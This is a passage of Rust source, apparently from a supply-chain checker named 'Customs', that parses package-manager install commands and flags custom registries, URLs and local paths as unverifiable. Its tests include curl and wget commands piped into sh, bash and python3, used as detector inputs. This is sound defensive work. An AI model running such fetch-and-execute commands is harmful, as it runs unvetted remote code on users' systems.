    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if a == "--" {
            i += 1;
            break;
        }
        if let Some((k, v)) = a.split_once('=').filter(|_| a.starts_with("--")) {
            match k {
                "--from" => {
                    targets.push(parse_pypi_spec(v));
                    from = true;
                }
                "--with" => targets.extend(split_with(v)),
                "--index" | "--default-index" | "--index-url" | "--extra-index-url" => {
                    targets.push(custom_index(Ecosystem::Pypi, v))
                }
                _ => {}
            }
            i += 1;
            continue;
        }
        match a {
            "--from" => {
                if let Some(v) = args.get(i + 1) {
                    targets.push(parse_pypi_spec(v));
                    from = true;
                }
                i += 2;
            }
            "--with" => {
                if let Some(v) = args.get(i + 1) {
                    targets.extend(split_with(v));
                }
                i += 2;
            }
            "--with-requirements" => {
                if let Some(f) = args.get(i + 1) {
                    targets.extend(requirements_file(&cwd.join(f), f, 0));
                }
                i += 2;
            }
            "--index" | "--default-index" | "--index-url" | "--extra-index-url" | "-i" => {
                if let Some(v) = args.get(i + 1) {
                    targets.push(custom_index(Ecosystem::Pypi, v));
                }
                i += 2;
            }
            _ if VALUE.contains(&a) => i += 2,
            _ if a.starts_with('-') => i += 1,
            _ => break,
        }
    }
    if !from {
        if let Some(cmd) = args.get(i) {
            targets.push(parse_pypi_spec(cmd));
        }
    }
    if !targets.is_empty() {
        out.push(Install {
            tool: tool.into(),
            targets,
        });
    }
}

fn pipx(args: &[String], cwd: &Path, out: &mut Vec<Install>) {
    let Some((sub, rest)) = args.split_first() else {
        return;
    };
    match sub.as_str() {
        "install" => out.push(Install {
            tool: "pipx install".into(),
            targets: pypi_args(rest, cwd),
        }),
        "inject" => {
            // The first positional is the existing app's venv, not a package.
            let rest = skip_opts(rest, PIPX_VALUE);
            if let Some((_, pkgs)) = rest.split_first() {
                out.push(Install {
                    tool: "pipx inject".into(),
                    targets: pypi_args(pkgs, cwd),
                });
            }
        }
        "run" => {
            let mut targets = Vec::new();
            let mut i = 0;
            let mut spec = false;
            while i < rest.len() {
                let a = rest[i].as_str();
                if a == "--spec" {
                    if let Some(v) = rest.get(i + 1) {
                        targets.push(parse_pypi_spec(v));
                        spec = true;
                    }
                    i += 2;
                } else if let Some(v) = a.strip_prefix("--spec=") {
                    targets.push(parse_pypi_spec(v));
                    spec = true;
                    i += 1;
                } else if PIPX_VALUE.contains(&a) {
                    i += 2;
                } else if a.starts_with('-') {
                    i += 1;
                } else {
                    break;
                }
            }
            let app = rest.get(i).filter(|_| !spec);
            let is_script = app.is_some_and(|a| a.to_ascii_lowercase().ends_with(".py"));
            if let Some(app) = app.filter(|_| !is_script) {
                targets.push(parse_pypi_spec(app));
            }
            if !targets.is_empty() {
                out.push(Install {
                    tool: "pipx run".into(),
                    targets,
                });
            }
            if let Some(app) = app.filter(|_| is_script) {
                run_script(app, true, cwd, out, "pipx run");
            }
        }
        _ => {}
    }
}

const PIPX_VALUE: &[&str] = &[
    "--python",
    "--suffix",
    "--pip-args",
    "--index-url",
    "-i",
    "--editable",
    "--preinstall",
];

/// Options of pip-compatible installers that take a value. Options not listed here are
/// treated as flags; `--opt=value` forms are handled generically.
const PYPI_VALUE: &[&str] = &[
    "-t",
    "--target",
    "--prefix",
    "--root",
    "--platform",
    "--python-version",
    "--implementation",
    "--abi",
    "--src",
    "--upgrade-strategy",
    "--progress-bar",
    "--log",
    "--log-file",
    "--cache-dir",
    "--trusted-host",
    "--proxy",
    "--timeout",
    "--retries",
    "--exists-action",
    "--cert",
    "--client-cert",
    "--global-option",
    "--install-option",
    "--config-settings",
    "-C",
    "--only-binary",
    "--no-binary",
    "--python",
    "-p",
    "--report",
    "--python-platform",
    "--resolution",
    "--prerelease",
    "--index-strategy",
    "--keyring-provider",
    "--link-mode",
    "--group",
    "-G",
    "--optional",
    "--extra",
    "-E",
    "--extras",
    "--package",
    "--script",
    "--branch",
    "--rev",
    "--tag",
    "--source",
    "--suffix",
    "--pip-args",
    "--marker",
    "-m",
    "--refresh-package",
    "--reinstall-package",
    "--upgrade-package",
    "-P",
    "--directory",
    "--project",
    "--config-file",
    "--use-feature",
    "--dependency-group",
];

const INDEX_OPTS: &[&str] = &[
    "-i",
    "--index-url",
    "--extra-index-url",
    "--index",
    "--default-index",
    "-f",
    "--find-links",
];

fn custom_index(eco: Ecosystem, url: &str) -> Target {
    Target::Unverifiable {
        ecosystem: eco,
        spec: url.to_string(),
        reason: format!("installs from a custom index or registry ({url}) that bypasses Customs"),
    }
}

/// Arguments of `pip install` and friends (after the subcommand).
pub fn pypi_args(args: &[String], cwd: &Path) -> Vec<Target> {
    let mut targets = Vec::new();
    let mut i = 0;
    let mut positional_only = false;
    while i < args.len() {
        let a = args[i].as_str();
        if positional_only || !a.starts_with('-') || a == "-" {
            targets.push(parse_pypi_spec(a));
            targets.extend(local_project(cwd, a));
            i += 1;
            continue;
        }
        if a == "--" {
            positional_only = true;
            i += 1;
            continue;
        }
        let (key, inline): (&str, Option<&str>) = if a.starts_with("--") {
            match a.split_once('=') {
                Some((k, v)) => (k, Some(v)),
                None => (a, None),
            }
        } else if a.len() > 2 && ["-r", "-c", "-e", "-i", "-f"].contains(&&a[..2]) {
            // Attached short values: `-rrequirements.txt`, `-e.`.
            (&a[..2], Some(&a[2..]))
        } else {
            (a, None)
        };
        let value = |i: &mut usize| -> Option<String> {
            match inline {
                Some(v) => Some(v.to_string()),
                None => {
                    *i += 1;
                    args.get(*i).cloned()
                }
            }
        };
        match key {
            "-r" | "--requirement" | "--requirements" => {
                if let Some(f) = value(&mut i) {
                    targets.extend(requirements_file(&cwd.join(&f), &f, 0));
                }
            }
            "-c" | "--constraint" | "--constraints" | "--override" | "--overrides" => {
                let _ = value(&mut i);
            }
            "-e" | "--editable" => {
                if let Some(v) = value(&mut i) {
                    targets.extend(editable(&v).or_else(|| local_project(cwd, &v)));
                }
            }
            k if INDEX_OPTS.contains(&k) => {
                if let Some(v) = value(&mut i) {
                    targets.push(custom_index(Ecosystem::Pypi, &v));
                }
            }
            "--with" => {
                if let Some(v) = value(&mut i) {
                    targets.extend(split_with(&v));
                }
            }
            "--spec" | "--from" => {
                if let Some(v) = value(&mut i) {
                    targets.push(parse_pypi_spec(&v));
                }
            }
            k if PYPI_VALUE.contains(&k) => {
                let _ = value(&mut i);
            }
            _ => {}
        }
        i += 1;
    }
    targets
}

/// Editable installs of local paths are the user's own code and are skipped; editable
/// URLs (VCS checkouts) fetch remote code and are flagged.
fn editable(v: &str) -> Option<Target> {
    if looks_like_url(v) {
        Some(Target::Unverifiable {
            ecosystem: Ecosystem::Pypi,
            spec: v.to_string(),
            reason: "editable install from a URL or VCS is not checked".into(),
        })
    } else {
        None
    }
}

pub(crate) fn looks_like_url(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    l.contains("://")
        || ["git+", "hg+", "svn+", "bzr+", "git@"]
            .iter()
            .any(|p| l.starts_with(p))
}

const ARCHIVE_EXT: &[&str] = &[
    ".whl", ".tar.gz", ".tgz", ".zip", ".tar.bz2", ".tar.xz", ".tar",
];

pub(crate) fn looks_like_path(s: &str) -> bool {
    s == "."
        || s == ".."
        || s.starts_with("./")
        || s.starts_with("../")
        || s.starts_with('/')
        || s.starts_with('~')
        || s.contains('\\')
        || (s.len() > 2 && s.as_bytes()[1] == b':' && s.as_bytes()[0].is_ascii_alphabetic())
        || ARCHIVE_EXT
            .iter()
            .any(|e| s.to_ascii_lowercase().ends_with(e))
}

/// Parse a PEP 508 requirement, a Poetry/uv `name@constraint`, or report why it cannot
/// be checked.
pub fn parse_pypi_spec(raw: &str) -> Target {
    let s = raw.trim();
    let unverifiable = |reason: &str| Target::Unverifiable {
        ecosystem: Ecosystem::Pypi,
        spec: s.to_string(),
        reason: reason.to_string(),
    };
    if looks_like_url(s) {
        return unverifiable("installs from a URL or VCS, which Customs cannot check");
    }
    if looks_like_path(s) || (s.contains('/') && !s.contains('@')) {
        return unverifiable("installs from a local path, which Customs does not scan");
    }
    static RE: OnceLock<Regex> = OnceLock::new();
    let re = RE.get_or_init(|| {
        Regex::new(r"^([A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?)\s*(\[[^\]]*\])?\s*(.*)$")
            .unwrap()
    });
    let Some(c) = re.captures(s) else {
        return unverifiable("could not parse the requirement");
    };
    let name = c[1].to_string();
    let rest = c.get(3).map(|m| m.as_str()).unwrap_or("");
    let rest = rest.split(';').next().unwrap_or("").trim();
    let version = if let Some(after) = rest.strip_prefix('@') {
        let after = after.trim();
        if looks_like_url(after) || looks_like_path(after) {
            return Target::Unverifiable {
                ecosystem: Ecosystem::Pypi,
                spec: s.to_string(),
                reason: format!("'{name}' is installed from a direct reference ({after}), which Customs cannot check"),
            };
        }
        (!after.is_empty() && after != "latest").then(|| after.to_string())
    } else {
        let compact: String = rest.chars().filter(|c| !c.is_whitespace()).collect();
        let compact = compact
            .trim_start_matches('(')
            .trim_end_matches(')')
            .to_string();
        if compact.is_empty() {
            None
        } else if !compact.starts_with(['=', '!', '<', '>', '~', '^']) {
            return unverifiable("could not parse the requirement");
        } else {
            match compact
                .strip_prefix("===")
                .or_else(|| compact.strip_prefix("=="))
            {
                Some(v) if !v.contains([',', '*']) => Some(v.to_string()),
                _ => Some(compact),
            }
        }
    };
    Target::Package {
        ecosystem: Ecosystem::Pypi,
        name: normalize_name(Ecosystem::Pypi, &name),
        version,
    }
}

/// Lines of a requirements file. Nested `-r` resolves relative to the including file.
fn requirements_file(path: &Path, shown: &str, depth: usize) -> Vec<Target> {
    let text = match std::fs::read_to_string(path) {
        Ok(t) if depth < 5 => t,
        Ok(_) => return vec![],
        Err(_) => {
            return vec![Target::Unverifiable {
                ecosystem: Ecosystem::Pypi,
                spec: format!("-r {shown}"),
                reason: format!("requirements file '{shown}' could not be read"),
            }]
        }
    };
    let dir = path
        .parent()
        .map(Path::to_path_buf)
        .unwrap_or_else(|| PathBuf::from("."));
    let mut targets = Vec::new();
    let joined = text.replace("\\\r\n", "").replace("\\\n", "");
    static OPT: OnceLock<Regex> = OnceLock::new();
    let opt = OPT.get_or_init(|| Regex::new(r"\s+--?[A-Za-z]").unwrap());
    for line in joined.lines() {
        let line = match line
            .find(" #")
            .or_else(|| line.starts_with('#').then_some(0))
        {
            Some(i) => &line[..i],
            None => line,
        }
        .trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('-') {
            let mut parts = line.splitn(2, |c: char| c.is_whitespace() || c == '=');
            let flag = parts.next().unwrap_or("");
            let value = parts.next().unwrap_or("").trim();
            let (flag, value) = match (flag.len() > 2 && !flag.starts_with("--"), value.is_empty())
            {
                (true, true) => (&flag[..2], &flag[2..]),
                _ => (flag, value),
            };
            match flag {
                "-r" | "--requirement" => {
                    targets.extend(requirements_file(&dir.join(value), value, depth + 1))
                }
                "-e" | "--editable" => {
                    targets.extend(editable(value).or_else(|| local_project(&dir, value)))
                }
                f if INDEX_OPTS.contains(&f) => targets.push(custom_index(Ecosystem::Pypi, value)),
                _ => {}
            }
            continue;
        }
        // Per-line options such as `--hash=sha256:...` follow the requirement.
        let req = match opt.find(line) {
            Some(m) => &line[..m.start()],
            None => line,
        };
        targets.push(parse_pypi_spec(req));
    }
    targets
}

const NPM_VALUE: &[&str] = &[
    "--prefix",
    "--tag",
    "-w",
    "--workspace",
    "--omit",
    "--include",
    "--install-strategy",
    "--cache",
    "--loglevel",
    "--userconfig",
    "--globalconfig",
    "--before",
    "--filter",
    "--dir",
    "-C",
    "--cwd",
    "--network-timeout",
    "--modules-folder",
    "--save-prefix",
    "--config",
    "--lockfile-dir",
    "--virtual-store-dir",
    "--store-dir",
    "--reporter",
    "--mutex",
    "--cache-folder",
    "--global-folder",
    "--link-folder",
    "--network-concurrency",
    "--child-concurrency",
    "--backend",
    "--cafile",
    "--ca",
];

/// Arguments of `npm install` and friends (after the subcommand).
pub fn npm_args(args: &[String]) -> Vec<Target> {
    let mut targets = Vec::new();
    let mut i = 0;
    let mut positional_only = false;
    while i < args.len() {
        let a = args[i].as_str();
        if positional_only || !a.starts_with('-') {
            targets.push(parse_npm_spec(a));
        } else if a == "--" {
            positional_only = true;
        } else if let Some(v) = a.strip_prefix("--registry=") {
            targets.push(custom_index(Ecosystem::Npm, v));
        } else if a == "--registry" {
            if let Some(v) = args.get(i + 1) {
                targets.push(custom_index(Ecosystem::Npm, v));
            }
            i += 1;
        } else if NPM_VALUE.contains(&a) {
            i += 1;
        }
        i += 1;
    }
    targets
}

const NPM_INSTALL: &[&str] = &[
    "install", "i", "in", "ins", "inst", "insta", "instal", "isnt", "isnta", "isntal", "isntall",
    "add",
];

/// First positional argument (the subcommand) after npm-style global options.
fn npm_subcommand(args: &[String]) -> Option<(&str, &[String])> {
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if !a.starts_with('-') {
            return Some((a, &args[i + 1..]));
        }
        i += if NPM_VALUE.contains(&a) || a == "--registry" {
            2
        } else {
            1
        };
    }
    None
}

/// npm's clean-install commands, which install exactly what the lockfile pins.
const NPM_CI: &[&str] = &[
    "ci",
    "clean-install",
    "ic",
    "install-clean",
    "isntall-clean",
    "install-ci-test",
    "cit",
    "clean-install-test",
    "sit",
];

fn npm(args: &[String], cwd: &Path, out: &mut Vec<Install>) {
    let Some((sub, rest)) = npm_subcommand(args) else {
        return;
    };
    // Global options may sit before the subcommand (`npm --registry X install y`).
    let pre: Vec<String> = args
        .iter()
        .take_while(|a| a.as_str() != sub)
        .cloned()
        .collect();
    let ci = NPM_CI.contains(&sub);
    if NPM_INSTALL.contains(&sub) || ci {
        let mut targets = npm_args(&pre);
        targets.extend(npm_args(rest));
        if ci || !has_positional(rest, NPM_VALUE) {
            targets.push(project(
                Manager::Npm,
                cwd,
                opt_value(args, &["--prefix", "-C"]),
            ));
        }
        out.push(Install {
            tool: if ci { "npm ci" } else { "npm install" }.into(),
            targets,
        });
    } else if sub == "exec" || sub == "x" {
        npx_like(rest, out, "npm exec");
    } else if matches!(sub, "init" | "create" | "innit") {
        create_like(rest, out, "npm init");
    }
}

fn pnpm(args: &[String], cwd: &Path, out: &mut Vec<Install>) {
    let Some((sub, rest)) = npm_subcommand(args) else {
        return;
    };
    match sub {
        "add" | "install" | "i" => {
            let mut targets = npm_args(rest);
            if sub != "add" && !has_positional(rest, NPM_VALUE) {
                targets.push(project(
                    Manager::Pnpm,
                    cwd,
                    opt_value(args, &["-C", "--dir"]),
                ));
            }
            if !targets.is_empty() {
                out.push(Install {
                    tool: format!("pnpm {sub}"),
                    targets,
                });
            }
        }
        "dlx" => npx_like(rest, out, "pnpm dlx"),
        "create" => create_like(rest, out, "pnpm create"),
        _ => {}
    }
}

fn yarn(args: &[String], cwd: &Path, out: &mut Vec<Install>) {
    // Bare `yarn` (options only) is `yarn install`.
    let Some((sub, rest)) = npm_subcommand(args) else {
        let info = ["-v", "--version", "-h", "--help"];
        if args.iter().any(|a| info.contains(&a.as_str())) {
            return;
        }
        out.push(Install {
            tool: "yarn install".into(),
            targets: vec![project(Manager::Yarn, cwd, opt_value(args, &["--cwd"]))],
        });
        return;
    };
    let (sub, rest) = if sub == "global" {
        match npm_subcommand(rest) {
            Some(x) => x,
            None => return,
        }
    } else {
        (sub, rest)
    };
    match sub {
        "add" => {
            let targets = npm_args(rest);
            if !targets.is_empty() {
                out.push(Install {
                    tool: "yarn add".into(),
                    targets,
                });
            }
        }
        "dlx" => npx_like(rest, out, "yarn dlx"),
        "create" => create_like(rest, out, "yarn create"),
        "install" => out.push(Install {
            tool: "yarn install".into(),
            targets: vec![project(Manager::Yarn, cwd, opt_value(args, &["--cwd"]))],
        }),
        _ => {}
    }
}

fn bun(args: &[String], cwd: &Path, out: &mut Vec<Install>) {
    let Some((sub, rest)) = npm_subcommand(args) else {
        return;
    };
    match sub {
        "add" | "a" | "install" | "i" => {
            let mut targets = npm_args(rest);
            if matches!(sub, "install" | "i") && !has_positional(rest, NPM_VALUE) {
                targets.push(project(Manager::Bun, cwd, opt_value(args, &["--cwd"])));
            }
            if !targets.is_empty() {
                out.push(Install {
                    tool: format!("bun {sub}"),
                    targets,
                });
            }
        }
        "x" => npx_like(rest, out, "bunx"),
        "create" | "c" => create_like(rest, out, "bun create"),
        _ => {}
    }
}

/// `npm init <initializer>`, `npm create`, `pnpm create`, `yarn create`, `bun create`: each
/// downloads and runs the package named after the initializer (`vite@5` is
/// `create-vite@5`, `@scope/app` is `@scope/create-app`, `@scope` is `@scope/create`).
/// Without an initializer, `npm init` only writes a package.json.
fn create_like(args: &[String], out: &mut Vec<Install>, tool: &str) {
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if a == "--" || !a.starts_with('-') {
            break;
        }
        i += if NPM_VALUE.contains(&a) { 2 } else { 1 };
    }
    let Some(init) = args.get(i).filter(|a| !a.is_empty() && a.as_str() != "--") else {
        return;
    };
    let target = if init.ends_with(".jsx") || init.ends_with(".tsx") || init.starts_with('.') {
        // `bun create ./Component.tsx` or a local template folder.
        return;
    } else if !init.starts_with('@') && init.contains('/') {
        Target::Unverifiable {
            ecosystem: Ecosystem::Npm,
            spec: init.clone(),
            reason: "a template from a GitHub repository is not checked".into(),
        }
    } else {
        parse_npm_spec(&create_package(init))
    };
    out.push(Install {
        tool: tool.into(),
        targets: vec![target],
    });
}

/// The package an initializer names, version kept.
fn create_package(init: &str) -> String {
    let (name, version) = match init.rfind('@') {
        Some(k) if k > 0 => (&init[..k], Some(&init[k + 1..])),
        _ => (init, None),
    };
    let pkg = match name.strip_prefix('@') {
        Some(scoped) => match scoped.split_once('/') {
            Some((scope, n)) => format!("@{scope}/create-{n}"),
            None => format!("@{scoped}/create"),
        },
        None => format!("create-{name}"),
    };
    match version {
        Some(v) => format!("{pkg}@{v}"),
        None => pkg,
    }
}

/// Deno options that take a separate value (`--config deno.json`); every other option with
/// a value is written `--name=value`.
const DENO_VALUE: &[&str] = &[
    "-c",
    "--config",
    "-L",
    "--log-level",
    "--import-map",
    "--node-modules-linker",
    "--cert",
    "--min-dep-age",
    "--location",
    "--seed",
    "--preload",
    "--require",
    "--conditions",
    "--inspect-publish-uid",
    "--ext",
    "-n",
    "--name",
    "--root",
    "--os",
    "--arch",
    "-p",
    "--package",
    // `deno serve`
    "--port",
    "--host",
];

/// Positional arguments of a Deno subcommand, up to `--`.
fn deno_positionals(args: &[String]) -> Vec<&str> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if a == "--" {
            break;
        }
        if !a.starts_with('-') {
            out.push(a);
        } else if DENO_VALUE.contains(&a) {
            i += 1;
        }
        i += 1;
    }
    out
}

/// What Deno fetches for a module or package specifier. `npm:` packages are checked;
/// JSR packages and remote URLs are not; a local file is the user's own code. With
/// `bare_is_npm`, a name without a prefix is an npm package, as for `deno add` and `deno x`.
pub(super) fn deno_spec(s: &str, bare_is_npm: bool) -> Option<Target> {
    let unverifiable = |reason: &str| {
        Some(Target::Unverifiable {
            ecosystem: Ecosystem::Npm,
            spec: s.to_string(),
            reason: reason.into(),
        })
    };
    if let Some(rest) = s.strip_prefix("npm:") {
        return Some(parse_npm_spec(without_subpath(rest)));
    }
    let lower = s.to_ascii_lowercase();
    if lower.starts_with("jsr:") {
        return unverifiable("JSR packages are not checked");
    }
    if lower.starts_with("https:") || lower.starts_with("http:") {
        return unverifiable("a remote module, which Customs cannot check");
    }
    if !bare_is_npm || s.contains(':') {
        return None;
    }
    match parse_npm_spec(s) {
        // `./main.ts`, `/abs/path`: local code.
        Target::Unverifiable { reason, .. } if reason.contains("local path") => None,
        t => Some(t),
    }
}

/// `preact@10/hooks` imports a file of `preact@10`.
fn without_subpath(spec: &str) -> &str {
    let from = if spec.starts_with('@') {
        spec.find('/').map_or(spec.len(), |i| i + 1)
    } else {
        0
    };
    match spec[from..].find('/') {
        Some(i) => &spec[..from + i],
        None => spec,
    }
}

fn deno(args: &[String], cwd: &Path, out: &mut Vec<Install>) {
    let mut i = 0;
    while i < args.len() && args[i].starts_with('-') {
        i += if DENO_VALUE.contains(&args[i].as_str()) {
            2
        } else {
            1
        };
    }
    let Some(sub) = args.get(i).map(String::as_str) else {
        return;
    };
    let rest = &args[i + 1..];
    let pos = deno_positionals(rest);
    let flag = |names: &[&str]| {
        rest.iter()
            .take_while(|a| *a != "--")
            .any(|a| names.contains(&a.as_str()))
    };
    // Local code that runs imports `npm:` packages, which Deno fetches on the spot.
    let local = |files: &[&str]| -> Vec<Target> {
        let paths: Vec<PathBuf> = files
            .iter()
            .filter(|f| !f.contains(':'))
            .map(|f| cwd.join(f))
            .collect();
        deno_imports(&paths, None)
    };
    let mut tool = format!("deno {sub}");
    let targets: Vec<Target> = match sub {
        "add" => pos.iter().filter_map(|p| deno_spec(p, true)).collect(),
        "install" | "i" if flag(&["-g", "--global"]) => pos
            .first()
            .and_then(|p| deno_spec(p, false))
            .into_iter()
            .collect(),
        // `--entrypoint main.ts` caches what local files import.
        "install" | "i" if flag(&["-e", "--entrypoint"]) => Vec::new(),
        "install" | "i" if !pos.is_empty() => {
            pos.iter().filter_map(|p| deno_spec(p, true)).collect()
        }
        "install" | "i" | "ci" => vec![project(Manager::Deno, cwd, None)],
        // The script is the first positional; the rest are its arguments.
        "run" | "serve" | "compile" => match pos.first() {
            Some(p) => match deno_spec(p, false) {
                Some(t) => vec![t],
                None => {
                    tool = format!("deno {sub} {p}");
                    local(&pos[..1])
                }
            },
            None => Vec::new(),
        },
        "test" | "bench" => local(&pos),
        "eval" => pos
            .first()
            .map(|code| deno_imports(&[], Some(code)))
            .unwrap_or_default(),
        "cache" => pos.iter().filter_map(|p| deno_spec(p, false)).collect(),
        "x" => return deno_x(rest, out, "deno x"),
        "create" => {
            let Some(init) = pos.first() else {
                return;
            };
            if let Some(i) = init.strip_prefix("npm:") {
                vec![parse_npm_spec(&create_package(i))]
            } else if flag(&["--npm"]) && !init.contains(':') {
                vec![parse_npm_spec(&create_package(init))]
            } else {
                deno_spec(init, false).into_iter().collect()
            }
        }
        _ => Vec::new(),
    };
    if !targets.is_empty() {
        out.push(Install { tool, targets });
    }
}

/// The most local modules [`deno_imports`] reads.
const MAX_DENO_MODULES: usize = 200;

fn deno_import_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r#"(?:\bfrom|\bimport)\s*\(?\s*["']([^"'\n]+)["']"#).unwrap())
}

/// The `npm:` packages that `entries` (local modules) and `code` import, following
/// relative imports through local files. JSR and URL imports are left out: Customs cannot
/// check them, and nearly every Deno program has some, so asking on each would be noise.
fn deno_imports(entries: &[PathBuf], code: Option<&str>) -> Vec<Target> {
    use std::io::Read;
    let mut targets = Vec::new();
    let mut seen = std::collections::HashSet::new();
    let mut queue: std::collections::VecDeque<PathBuf> = entries.iter().cloned().collect();
    let mut scan =
        |text: &str, dir: Option<&Path>, queue: &mut std::collections::VecDeque<PathBuf>| {
            for c in deno_import_re().captures_iter(text) {
                let spec = &c[1];
                if spec.starts_with("npm:") {
                    if let Some(t) = deno_spec(spec, false) {
                        if !targets.contains(&t) {
                            targets.push(t);
                        }
                    }
                } else if let Some(dir) =
                    dir.filter(|_| spec.starts_with("./") || spec.starts_with("../"))
                {
                    queue.push_back(dir.join(spec));
                }
            }
        };
    if let Some(code) = code {
        scan(code, None, &mut queue);
    }
    let mut read = 0;
    while let Some(path) = queue.pop_front() {
        let key = path.canonicalize().unwrap_or_else(|_| path.clone());
        if read >= MAX_DENO_MODULES || !seen.insert(key) {
            continue;
        }
        let mut text = String::new();
        let Ok(f) = std::fs::File::open(&path) else {
            continue;
        };
        if f.take(MAX_SCRIPT_BYTES).read_to_string(&mut text).is_err() {
            continue;
        }
        read += 1;
        scan(&text, path.parent(), &mut queue);
    }
    targets
}

/// `deno x` and `dx`, Deno's `npx`: `--package` names the package, otherwise the first
/// positional does; a name without a prefix comes from npm.
fn deno_x(args: &[String], out: &mut Vec<Install>, tool: &str) {
    let mut targets: Vec<Target> = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if let Some(v) = a.strip_prefix("--package=") {
            targets.extend(deno_spec(v, true));
        } else if a == "-p" || a == "--package" {
            targets.extend(args.get(i + 1).and_then(|v| deno_spec(v, true)));
            i += 1;
        }
        i += 1;
    }
    if targets.is_empty() {
        targets.extend(
            deno_positionals(args)
                .first()
                .and_then(|p| deno_spec(p, true)),
        );
    }
    if !targets.is_empty() {
        out.push(Install {
            tool: tool.into(),
            targets,
        });
    }
}

/// `npx`, `npm exec`, `pnpm dlx`, `yarn dlx`, `bunx`: `--package` names packages and the
/// first positional is a command; without `--package` the first positional is the package.
fn npx_like(args: &[String], out: &mut Vec<Install>, tool: &str) {
    let mut targets = Vec::new();
    let mut has_package = false;
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if a == "--" {
            i += 1;
            break;
        }
        if let Some(v) = a.strip_prefix("--package=") {
            targets.push(parse_npm_spec(v));
            has_package = true;
        } else if a == "-p" || a == "--package" {
            if let Some(v) = args.get(i + 1) {
                targets.push(parse_npm_spec(v));
                has_package = true;
            }
            i += 1;
        } else if a == "-c" || a == "--call" {
            // An inline command; the packages it needs come from --package.
            has_package = true;
            i += 1;
        } else if a == "--registry" {
            if let Some(v) = args.get(i + 1) {
                targets.push(custom_index(Ecosystem::Npm, v));
            }
            i += 1;
        } else if NPM_VALUE.contains(&a) {
            i += 1;
        } else if !a.starts_with('-') {
            break;
        }
        i += 1;
    }
    if !has_package {
        if let Some(cmd) = args.get(i) {
            targets.push(parse_npm_spec(cmd));
        }
    }
    if !targets.is_empty() {
        out.push(Install {
            tool: tool.into(),
            targets,
        });
    }
}

pub(crate) fn valid_npm_name(name: &str) -> bool {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"^(@[A-Za-z0-9][A-Za-z0-9._~-]*/)?[A-Za-z0-9_~-][A-Za-z0-9._~-]*$").unwrap()
    })
    .is_match(name)
        && name.len() <= 214
}

/// Parse an npm package spec (`pkg`, `pkg@1.2.3`, `@scope/pkg@^1`, `alias@npm:pkg@1`), or
/// report why it cannot be checked.
pub fn parse_npm_spec(raw: &str) -> Target {
    let s = raw.trim();
    let unverifiable = |reason: &str| Target::Unverifiable {
        ecosystem: Ecosystem::Npm,
        spec: s.to_string(),
        reason: reason.to_string(),
    };
    // `alias@npm:real@range` installs `real`.
    if let Some(idx) = s.find("@npm:") {
        if idx > 0 {
            return parse_npm_spec(&s[idx + 5..]);
        }
    }
    let lower = s.to_ascii_lowercase();
    if looks_like_url(s)
        || [
            "github:",
            "gitlab:",
            "bitbucket:",
            "gist:",
            "git:",
            "http:",
            "https:",
        ]
        .iter()
        .any(|p| lower.starts_with(p))
    {
        return unverifiable("installs from a git repository or URL, which Customs cannot check");
    }
    if ["file:", "link:", "workspace:", "portal:", "patch:"]
        .iter()
        .any(|p| lower.starts_with(p))
        || s.starts_with('.')
        || s.starts_with('/')
        || s.starts_with('~')
        || lower.ends_with(".tgz")
        || lower.ends_with(".tar.gz")
        || lower.ends_with(".tar")
    {
        return unverifiable("installs from a local path or tarball, which Customs does not scan");
    }
    let (name, range) = if let Some(rest) = s.strip_prefix('@') {
        match rest.find('@') {
            Some(i) => (&s[..i + 1], Some(&rest[i + 1..])),
            None => (s, None),
        }
    } else {
        if s.contains('/') {
            return unverifiable(
                "GitHub shorthand (user/repo) installs from git, which Customs cannot check",
            );
        }
        match s.split_once('@') {
            Some((n, r)) => (n, Some(r)),
            None => (s, None),
        }
    };
    if !valid_npm_name(name) {
        return unverifiable("could not parse the package spec");
    }
    if let Some(r) = range {
        if r.contains(':') || looks_like_url(r) {
            return unverifiable("version points at a git repository, URL, or path");
        }
    }
    let version = range
        .map(str::trim)
        .filter(|r| !r.is_empty() && *r != "latest" && *r != "*")
        .map(str::to_string);
    Target::Package {
        ecosystem: Ecosystem::Npm,
        name: normalize_name(Ecosystem::Npm, name),
        version,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn pkg(eco: Ecosystem, name: &str, version: Option<&str>) -> Target {
        Target::Package {
            ecosystem: eco,
            name: name.into(),
            version: version.map(Into::into),
        }
    }
    fn py(name: &str, v: Option<&str>) -> Target {
        pkg(Ecosystem::Pypi, name, v)
    }
    fn js(name: &str, v: Option<&str>) -> Target {
        pkg(Ecosystem::Npm, name, v)
    }

    /// All targets of all installs in `cmd`.
    fn targets(cmd: &str) -> Vec<Target> {
        parse_command(cmd, Path::new("/nonexistent"))
            .into_iter()
            .flat_map(|i| i.targets)
            .collect()
    }

    fn tools(cmd: &str) -> Vec<String> {
        parse_command(cmd, Path::new("/"))
            .into_iter()
            .map(|i| i.tool)
            .collect()
    }

    fn scripts(cmd: &str) -> Vec<(String, String)> {
        targets(cmd)
            .into_iter()
            .filter_map(|t| match t {
                Target::RemoteScript { url, runner } => Some((url, runner)),
                _ => None,
            })
            .collect()
    }

    fn script(url: &str, runner: &str) -> Vec<(String, String)> {
        vec![(url.to_string(), runner.to_string())]
    }

    #[test]
    fn remote_scripts_piped_into_an_interpreter() {
        assert_eq!(
            scripts("curl -fsSL https://sh.rustup.rs | sh -s -- -y"),
            script("https://sh.rustup.rs", "sh")
        );
        assert_eq!(
            scripts("wget -qO- https://x.example/i.sh | sudo -E bash"),
            script("https://x.example/i.sh", "bash")
        );
        assert_eq!(
            scripts("curl -s https://x.example/get.py | tr -d '\\r' | python3 -"),
            script("https://x.example/get.py", "python3")
        );
        assert_eq!(
            scripts("cd /tmp && curl https://x.example/a.sh | env FOO=1 /bin/bash"),
            script("https://x.example/a.sh", "bash")
        );
        assert_eq!(
            tools("curl -fsSL https://sh.rustup.rs | sh"),
            vec!["curl | sh"]
        );
    }

    #[test]
